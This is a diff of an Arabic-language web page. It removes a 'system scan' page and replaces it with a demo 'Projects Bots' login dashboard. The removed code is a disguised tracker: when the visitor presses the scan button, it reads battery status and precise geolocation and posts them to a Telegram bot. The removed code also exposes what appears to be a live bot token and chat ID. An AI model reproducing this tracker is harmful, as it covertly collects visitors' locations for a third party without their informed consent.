@@ -3,222 +3,119 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام الاستشعار المتقدم 2026 | ربط تيليجرام</title>
-    <style>
-        /* إعدادات الواجهة النيون والزجاجية */
-        body { 
-            margin: 0; 
-            overflow: hidden; 
-            background-color: #050505; 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            color: #ffffff; 
-        }
-        canvas { 
-            display: block; 
-            position: absolute; 
-            top: 0; 
-            left: 0; 
-            z-index: -1; 
-        }
-        .container {
-            position: absolute; 
-            top: 50%; 
-            left: 50%; 
-            transform: translate(-50%, -50%);
-            width: 85%; 
-            max-width: 450px; 
-            padding: 40px;
-            background: rgba(10, 10, 10, 0.4);
-            backdrop-filter: blur(20px); 
-            -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(0, 255, 255, 0.2);
-            border-radius: 24px; 
-            box-shadow: 0 0 50px rgba(0, 255, 255, 0.15), inset 0 0 20px rgba(0, 255, 255, 0.05);
-            text-align: center;
-        }
-        h1 {
-            font-size: 2.2em; 
-            margin-bottom: 25px;
-            color: #00ffff; 
-            text-shadow: 0 0 10px #00ffff, 0 0 20px #00ffff, 0 0 40px #00ffff;
-            letter-spacing: 2px;
-        }
-        .status-panel { 
-            margin: 20px 0; 
-            padding: 20px; 
-            background: rgba(0, 0, 0, 0.5); 
-            border-radius: 12px; 
-            border: 1px solid rgba(0, 255, 255, 0.4); 
-            font-size: 1.1em;
-            text-shadow: 0 0 5px rgba(255, 255, 255, 0.5);
-            transition: 0.3s;
-        }
-        button {
-            background: transparent; 
-            color: #00ffff; 
-            padding: 15px 40px; 
-            font-size: 1.2em; 
-            font-weight: bold;
-            border: 2px solid #00ffff; 
-            border-radius: 12px; 
-            cursor: pointer;
-            box-shadow: 0 0 15px rgba(0, 255, 255, 0.4), inset 0 0 10px rgba(0, 255, 255, 0.2); 
-            transition: all 0.4s ease;
-            text-transform: uppercase;
-        }
-        button:hover { 
-            background: #00ffff; 
-            color: #000000; 
-            box-shadow: 0 0 40px #00ffff, inset 0 0 20px #00ffff; 
-            transform: scale(1.05);
-        }
-    </style>
+    <title>Projects Bots | 2026</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
-    <div class="container">
-        <h1>SYSTEM INITIATION</h1>
-        <div class="status-panel" id="statusBox">بانتظار مزامنة البيانات...</div>
-        <button id="activateBtn">بدء الفحص</button>
+
+    <div id="loading-screen" class="screen active">
+        <div class="loader-container">
+            <div class="ai-core"></div>
+            <div class="ring"></div>
+            <div class="ring"></div>
+            <div class="ring"></div>
+            <p class="loading-text">جاري تهيئة النظام الذكي...</p>
+        </div>
     </div>
 
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
-    <script>
-        // إعدادات الخلفية الـ 3D التفاعلية
-        const scene = new THREE.Scene();
-        const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
-        const renderer = new THREE.WebGLRenderer({ alpha: true, antialias: true });
-        renderer.setSize(window.innerWidth, window.innerHeight);
-        document.body.appendChild(renderer.domElement);
-
-        const geometry = new THREE.BufferGeometry();
-        const particlesCount = 4000;
-        const posArray = new Float32Array(particlesCount * 3);
-        
-        for(let i = 0; i < particlesCount * 3; i++) {
-            posArray[i] = (Math.random() - 0.5) * 12;
-        }
-        
-        geometry.setAttribute('position', new THREE.BufferAttribute(posArray, 3));
-        const material = new THREE.PointsMaterial({ size: 0.008, color: 0x00ffff, transparent: true, opacity: 0.8 });
-        const particlesMesh = new THREE.Points(geometry, material);
-        scene.add(particlesMesh);
-        camera.position.z = 4;
-
-        let mouseX = 0; 
-        let mouseY = 0;
-
-        document.addEventListener('mousemove', (event) => {
-            mouseX = (event.clientX / window.innerWidth) - 0.5;
-            mouseY = (event.clientY / window.innerHeight) - 0.5;
-        });
-
-        document.addEventListener('touchmove', (event) => {
-            mouseX = (event.touches[0].clientX / window.innerWidth) - 0.5;
-            mouseY = (event.touches[0].clientY / window.innerHeight) - 0.5;
-        });
-
-        const animate = () => {
-            requestAnimationFrame(animate);
-            particlesMesh.rotation.y += 0.002;
-            particlesMesh.rotation.x += 0.001;
+    <div id="auth-screen" class="screen">
+        <div class="auth-box glass-panel">
+            <h2><i class="fa-solid fa-robot"></i> Projects Bots</h2>
+            <p>نظام تسجيل الدخول المدعوم بالـ AI</p>
             
-            particlesMesh.position.x += (mouseX * 3 - particlesMesh.position.x) * 0.05;
-            particlesMesh.position.y += (-mouseY * 3 - particlesMesh.position.y) * 0.05;
-            
-            renderer.render(scene, camera);
-        };
-        animate();
+            <form id="login-form">
+                <div class="input-group">
+                    <i class="fa-solid fa-envelope"></i>
+                    <input type="email" id="email" placeholder="البريد الإلكتروني" required>
+                </div>
+                <div class="input-group">
+                    <i class="fa-solid fa-lock"></i>
+                    <input type="password" id="password" placeholder="كلمة المرور" required>
+                </div>
+                <button type="submit" class="btn-primary">تسجيل الدخول <i class="fa-solid fa-arrow-left"></i></button>
+            </form>
+            <div class="auth-switch">
+                <p>ليس لديك حساب؟ <span onclick="alert('في هذه النسخة الديمو، استخدم حساب الأونر أو أي حساب وهمي لتجربة واجهة المستخدم.')">إنشاء حساب جديد</span></p>
+            </div>
+            <div id="auth-error" class="error-msg"></div>
+        </div>
+    </div>
 
-        // -----------------------------------------
-        // إعدادات بوت التيليجرام
-        // -----------------------------------------
-        
-        // خلي التوكن مالتك هنا بين الأقواس
-        const BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN_HERE';
-        // خلي الـ ID الخاص بحسابك هنا
-        const CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID_HERE';
+    <div id="dashboard-screen" class="screen">
+        <nav class="navbar glass-panel">
+            <div class="logo">
+                <i class="fa-solid fa-microchip"></i> Projects Bots
+            </div>
+            <div class="user-info">
+                <span id="user-role-badge" class="badge"></span>
+                <button id="logout-btn" class="btn-danger"><i class="fa-solid fa-right-from-bracket"></i> خروج</button>
+            </div>
+        </nav>
 
-        const activateBtn = document.getElementById('activateBtn');
-        const statusBox = document.getElementById('statusBox');
+        <main class="dashboard-content">
+            <section id="panel-role_1" class="panel hidden">
+                <div class="panel-header glass-panel">
+                    <h3><i class="fa-solid fa-crown"></i> لوحة تحكم المالك</h3>
+                    <p>مرحباً بك يا وائل، أنت تملك الصلاحيات الكاملة هنا.</p>
+                </div>
+                <div class="action-card glass-panel">
+                    <h4>رفع مشروع جديد</h4>
+                    <input type="file" id="owner-file-upload" class="file-input">
+                    <button id="owner-upload-btn" class="btn-success"><i class="fa-solid fa-cloud-arrow-up"></i> رفع ونشر</button>
+                    <div id="ai-scan-status" class="scan-status hidden">
+                        <i class="fa-solid fa-spinner fa-spin"></i> الذكاء الاصطناعي يفحص الملفات...
+                    </div>
+                </div>
+            </section>
 
-        activateBtn.addEventListener('click', async () => {
-            statusBox.innerHTML = "<span style='color:#00ffff;'>جاري استخراج البيانات...</span>";
-            let messageText = "🌐 **تقرير النظام المتقدم** 🌐\n\n";
+            <section id="panel-role_2" class="panel hidden">
+                <div class="panel-header glass-panel">
+                    <h3><i class="fa-solid fa-code"></i> بيئة المطورين</h3>
+                    <p>هنا يتم بناء المستقبل. ارفع ملفاتك بعد التأكد من خلوها من الأكواد الخبيثة.</p>
+                </div>
+                <div class="action-card glass-panel">
+                    <p>لتفعيل رفع الملفات، يجب استكمال التحقق في منصة المطورين.</p>
+                    <a href="projects-developers-demo.html" class="btn-primary" onclick="alert('سيتم توجيهك إلى Projects Developers (الموقع الثاني) لاستكمال الـ Captcha والـ Cloudflare')"><i class="fa-solid fa-shield-halved"></i> الانتقال إلى Projects Developers</a>
+                </div>
+            </section>
 
-            // 1. استخراج حالة البطارية
-            try {
-                if (navigator.getBattery) {
-                    const battery = await navigator.getBattery();
-                    messageText += `🔋 نسبة الشحن: ${Math.round(battery.level * 100)}%\n`;
-                    messageText += `⚡ متصل بالطاقة: ${battery.charging ? 'نعم' : 'لا'}\n`;
-                } else {
-                    messageText += "🔋 الشحن: غير مدعوم في هذا المتصفح\n";
-                }
-            } catch (error) {
-                console.error("Battery API Error:", error);
-            }
+            <section id="panel-role_3" class="panel hidden">
+                <div class="panel-header glass-panel">
+                    <h3><i class="fa-solid fa-user"></i> واجهة المستخدم</h3>
+                    <p>يمكنك تصفح المشاريع وتنزيلها.</p>
+                </div>
+                <div class="join-dev-card glass-panel">
+                    <h4>هل تريد الانضمام لفريق الـ Developers؟</h4>
+                    <p>للانضمام إلى قسم المطورين، يجب عليك تسجيل الدخول عبر منصتنا المخصصة للمطورين، اجتياز اختبارات الذكاء الاصطناعي، والتحقق الأمني.</p>
+                    <button class="btn-secondary" onclick="alert('طلب الانضمام قيد التطوير للنسخة القادمة!')">طلب انضمام <i class="fa-solid fa-rocket"></i></button>
+                </div>
+            </section>
 
-            // 2. استخراج الموقع الجغرافي
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        const accuracy = position.coords.accuracy;
-                        
-                        messageText += `📍 الموقع المباشر: https://maps.google.com/?q=${lat},${lon}\n`;
-                        messageText += `🎯 دقة التحديد: ${Math.round(accuracy)} متر\n`;
-                        
-                        // إرسال البيانات للتيليجرام
-                        sendToTelegram(messageText);
-                        statusBox.innerHTML = "<span style='color:#00ff00;'>تمت العملية بنجاح. النظام مفعل.</span>";
-                    }, 
-                    (error) => {
-                        messageText += `❌ الموقع: تم رفض الصلاحية أو تعذر الوصول للإحداثيات.\n`;
-                        sendToTelegram(messageText);
-                        statusBox.innerHTML = "<span style='color:#ff0000;'>فشل الاتصال بالأقمار الصناعية (تم الرفض).</span>";
-                    }, 
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                );
-            } else {
-                messageText += "❌ الموقع: المتصفح لا يدعم تحديد الموقع.\n";
-                sendToTelegram(messageText);
-                statusBox.innerHTML = "النظام غير مدعوم.";
-            }
-        });
+            <section class="public-files glass-panel mt-2">
+                <h3><i class="fa-solid fa-download"></i> المشاريع المتاحة</h3>
+                <div id="files-container" class="files-grid">
+                    <div class="file-card">
+                        <i class="fa-brands fa-whatsapp file-icon"></i>
+                        <h4>بوت واتساب رسمي</h4>
+                        <p>بواسطة: الأونر</p>
+                        <button class="btn-download"><i class="fa-solid fa-download"></i> تنزيل حقيقي</button>
+                    </div>
+                </div>
+            </section>
+        </main>
 
-        // دالة إرسال البيانات لتيليجرام باستخدام API
-        function sendToTelegram(text) {
-            if (BOT_TOKEN === '7925284808:AAHruzGSd8itzV_Q19TjncCHhP0yNwanPWg' || CHAT_ID === '8597271751') {
-                console.error("لازم تخلي الـ BOT_TOKEN والـ CHAT_ID بالكود.");
-                return;
-            }
+        <footer class="glass-panel">
+            <p>جميع الحقوق محفوظة &copy; 2026 باسم <strong>وائل | Wano</strong></p>
+            <div class="social-links">
+                <a href="https://github.com/wn6b" target="_blank"><i class="fa-brands fa-github"></i> wn6b</a>
+                <a href="#" onclick="alert('Discord: wn6b')"><i class="fa-brands fa-discord"></i> wn6b</a>
+                <a href="https://tiktok.com/@w_n6b" target="_blank"><i class="fa-brands fa-tiktok"></i> w_n6b</a>
+                <a href="https://youtube.com/@wn5b" target="_blank"><i class="fa-brands fa-youtube"></i> wn5b</a>
+            </div>
+        </footer>
+    </div>
 
-            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            
-            fetch(telegramUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: text,
-                    parse_mode: 'Markdown'
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if(!data.ok) console.error('خطأ من تيليجرام:', data.description);
-            })
-            .catch(err => console.error('خطأ في إرسال البيانات:', err));
-        }
-
-        window.addEventListener('resize', () => {
-            camera.aspect = window.innerWidth / window.innerHeight;
-            camera.updateProjectionMatrix();
-            renderer.setSize(window.innerWidth, window.innerHeight);
-        });
-    </script>
+    <script src="script.js"></script>
 </body>
 </html>
